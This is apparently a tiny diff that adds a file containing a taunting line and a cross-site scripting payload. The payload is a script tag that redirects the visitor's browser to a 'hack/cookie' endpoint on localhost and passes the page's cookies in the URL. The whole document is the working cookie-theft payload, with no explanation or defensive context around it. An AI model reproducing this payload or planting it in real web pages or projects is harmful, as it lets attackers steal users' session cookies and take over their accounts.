@@ -1,0 +1,2 @@
+You are getting redirected and hacked!
+<script>window.location ='http://localhost:8001/hack/cookie?output=store&cookie='+escape(document.cookie);</script>
